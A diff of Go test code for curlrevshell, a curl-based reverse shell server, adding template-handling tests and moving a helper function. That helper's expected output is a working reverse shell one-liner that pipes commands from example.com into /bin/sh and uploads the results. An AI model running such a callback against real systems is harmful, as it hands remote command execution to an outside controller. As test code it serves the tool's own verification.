@@ -5,11 +5,15 @@ package hsrv
  * Tests for script.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20241222
+ * Last Modified 20250112
  */
 
 import (
 	"bytes"
+	"context"
+	"fmt"
+	"io"
+	"log/slog"
 	"net"
 	"net/http"
 	"net/http/httptest"
@@ -17,11 +21,14 @@ import (
 	"path/filepath"
 	"regexp"
 	"strings"
+	"sync"
 	"testing"
 	"text/template"
 
+	"github.com/magisterquis/curlrevshell/internal/iobroker"
 	"github.com/magisterquis/curlrevshell/lib/chanlog"
 	"github.com/magisterquis/curlrevshell/lib/crstemplate"
+	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
 )
 
@@ -77,7 +84,7 @@ curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/IDID -T- >/dev/null 2
 	cl.ExpectEmpty(t)
 }
 
-/* Make sure changing and deleting a template file works. */
+// Make sure changing and deleting a template file works.
 func TestServerScriptHandler_FromFile(t *testing.T) {
 	cl, _, _, s, _ := newTestServer(t)
 	fn := filepath.Join(t.TempDir(), "kittens.tmpl")
@@ -102,7 +109,7 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 		)
 		if expResCode != rr.Code {
 			t.Errorf(
-				"Unexpected response code %d (!= %d)",
+				"Incorrect response code\n got:%d\nwant:%d",
 				rr.Code,
 				expResCode,
 			)
@@ -119,7 +126,8 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 		cl.ExpectEmpty(t)
 	}
 
-	/* Test a custom template file with a subtemplate. */
+	/* Test a custom template file with a script (i.e. normal)
+	subtemplate. */
 	t.Run("template_in_file", func(t *testing.T) {
 		if err := os.WriteFile(
 			fn,
@@ -133,6 +141,24 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
 		}
 		want = "templatey kittens: example.com"
+		f(t, http.StatusOK)
+	})
+
+	/* Test a custom template file with a sub-sub template. */
+	t.Run("subtemplate_in_file", func(t *testing.T) {
+		if err := os.WriteFile(
+			fn,
+			[]byte(
+				`{{define "critter_name"}}moose{{end}}
+				{{define "script"}}templatey `+
+					`{{template "critter_name" .}}: `+
+					`{{.URL}}{{end}}`,
+			),
+			0660,
+		); nil != err {
+			t.Fatalf("Error writing template to %s: %s", fn, err)
+		}
+		want = "templatey moose: example.com"
 		f(t, http.StatusOK)
 	})
 
@@ -158,8 +184,8 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 				err,
 			)
 		}
-		want = ""
-		f(t, http.StatusInternalServerError)
+		want = wantDefault
+		f(t, http.StatusOK)
 	})
 
 	/* Test removing the file. */
@@ -170,6 +196,33 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 		want = wantDefault
 		f(t, http.StatusOK)
 	})
+
+	/* Test a file which has a non subtemplate-template. */
+	t.Run("without_subtemplate", func(t *testing.T) {
+		if err := os.WriteFile(
+			fn,
+			[]byte(`kittens`),
+			0660,
+		); nil != err {
+			t.Fatalf("Error writing template to %s: %s", fn, err)
+		}
+		want = ""
+		f(t, http.StatusInternalServerError)
+	})
+
+	/* Test a file which has only an unused subtemplate. */
+	t.Run("unused_subtemplate", func(t *testing.T) {
+		if err := os.WriteFile(
+			fn,
+			[]byte(`{{define "kittens"}}moose: {{.URL}}{{end}}`),
+			0660,
+		); nil != err {
+			t.Fatalf("Error writing template to %s: %s", fn, err)
+		}
+		want = wantDefault
+		f(t, http.StatusOK)
+	})
+
 }
 
 func TestC2URL(t *testing.T) {
@@ -263,37 +316,6 @@ func TestC2URL(t *testing.T) {
 	cl.ExpectEmpty(t)
 }
 
-// checkDefaultCallbackScript checks to see if got looks like the default
-// callback script.  The ID and publickey will be replaced  with dummy values.
-func checkDefaultCallbackScript(t *testing.T, got string) {
-	t.Helper()
-	/* Make sure the template came out ok, too. */
-	want := `#!/bin/sh
-curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/zzz -N  </dev/null 2>&0 |
-/bin/sh 2>&1 |
-curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>&1
-`
-
-	/* Replace unreliable bits with dummy values. */
-	got = regexp.MustCompile( /* Remove hash. */
-		`sha256//[0-9A-z+/]{43}=`,
-	).ReplaceAllString(got, `sha256//xxx=`)
-	got = regexp.MustCompile( /* Remove random ID. */
-		`https://example.com/(i|o)/\S+`,
-	).ReplaceAllString(got, `https://example.com/$1/zzz`)
-
-	/* See if it looks right. */
-	if want != got {
-		t.Errorf(
-			"Incorrect body:\n"+
-				"got:\n%s\n"+
-				"want:\n%s",
-			got,
-			want,
-		)
-	}
-}
-
 // Make sure we can set the script URL in the output.
 func TestServer_SetScriptURLPath(t *testing.T) {
 	var (
@@ -350,6 +372,118 @@ func TestServer_SetScriptURLPath(t *testing.T) {
 				want,
 			)
 		}
+	}
+}
+
+// Make sure helpful messages about non-subtemplate templates work.
+func TestServer_IncorrectSubtemplates(t *testing.T) {
+	/* Make a non-subtemplate template file. */
+	var (
+		tmplf = filepath.Join(t.TempDir(), "tmpl")
+		have  = "kittens"
+	)
+	if err := os.WriteFile(tmplf, []byte(have), 0600); nil != err {
+		t.Fatalf(
+			"Error writing template %q to %s: %s",
+			have,
+			tmplf,
+			err,
+		)
+	}
+
+	/* Start a server. */
+	var (
+		ich = make(chan string, 1024)
+		och = make(chan opshell.CLine, 1024)
+	)
+	iob, err := iobroker.New(ich, och)
+	if nil != err {
+		t.Fatalf("Error setting up IO Broker: %s", err)
+	}
+	s, err := New(
+		slog.New(slog.NewJSONHandler(io.Discard, nil)),
+		"127.0.0.1:0",
+		"",
+		tmplf,
+		ich,
+		och,
+		iob,
+		"",
+		nil,
+		false,
+		true,
+		DefaultURLPaths,
+	)
+	if nil != err {
+		t.Fatalf("Error starting server: %s", err)
+	}
+
+	/* Start everything going. */
+	ctx, cancel := context.WithCancelCause(context.Background())
+	eg, ectx := ctxerrgroup.WithContext(ctx)
+	eg.GoContext(ectx, s.Do)
+	eg.GoContext(ectx, iob.Do)
+
+	/* Function to shut down the server. */
+	shutdown := sync.OnceFunc(func() {
+		/* Tell everything to stop. */
+		cancel(errTestEnding)
+		if err := eg.Wait(); nil != err {
+			t.Fatalf("Unexpected server error: %s", err)
+		}
+		close(och)
+		close(ich)
+	})
+	t.Cleanup(shutdown) /* For just in case. */
+
+	/* Make sure we get a warning about templates. */
+	wantCLines := []opshell.CLine{{
+		Line: fmt.Sprintf("Listening on %s", s.l.Addr()),
+	}, {
+		Color: opshell.ColorRed,
+		Line: fmt.Sprintf(
+			"Error generating callback one-liners: "+
+				"generating line for %s: adding custom "+
+				"templates: template data outside of "+
+				"subtemplates",
+			s.l.Addr(),
+		),
+	}, {
+		Color: opshell.ColorRed,
+		Line:  noSubtemplateWarning,
+	}}
+	opshell.ExpectShellMessages(t, och, wantCLines...)
+	opshell.ExpectNoShellMessages(t, och, shutdown)
+}
+
+// checkDefaultCallbackScript checks to see if got looks like the default
+// callback script.  The ID and publickey will be replaced  with dummy values.
+func checkDefaultCallbackScript(t *testing.T, got string) {
+	t.Helper()
+	/* Make sure the template came out ok, too. */
+	want := `#!/bin/sh
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/zzz -N  </dev/null 2>&0 |
+/bin/sh 2>&1 |
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>&1
+`
+
+	/* Replace unreliable bits with dummy values. */
+	got = regexp.MustCompile( /* Remove hash. */
+		`sha256//[0-9A-z+/]{43}=`,
+	).ReplaceAllString(got, `sha256//xxx=`)
+	got = regexp.MustCompile( /* Remove random ID. */
+		`https://example.com/(i|o)/\S+`,
+	).ReplaceAllString(got, `https://example.com/$1/zzz`)
+
+	/* See if it looks right. */
+	if want != got {
+		t.Errorf(
+			"Incorrect body:\n"+
+				"got:\n%s\n"+
+				"want:\n%s",
+			got,
+			want,
+		)
 	}
 }
 
